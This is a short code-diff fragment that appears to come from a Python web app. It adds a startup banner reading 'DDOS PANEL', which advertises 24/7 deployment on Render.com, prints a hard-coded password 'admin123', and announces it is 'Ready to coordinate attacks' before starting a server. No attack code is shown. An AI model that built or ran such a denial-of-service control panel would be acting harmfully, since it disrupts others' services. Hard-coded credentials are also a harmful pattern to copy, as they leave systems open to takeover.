+    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║     
+    ██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝███████║██╔██╗ ██║█████╗  ██║     
+    ██║  ██║██║  ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║     
+    ██████╔╝██████╔╝╚██████╔╝███████║    ██║     ██║  ██║██║ ╚████║███████╗███████╗
+    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
+                                                                                      
+                          [WEB CONTROL PANEL]
+                     [Deploy on Render.com - 24/7]
+\033[0m
+    🌐 Starting server on port {port}
+    🔐 Password: admin123
+    📡 Ready to coordinate attacks
+    """)
     
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
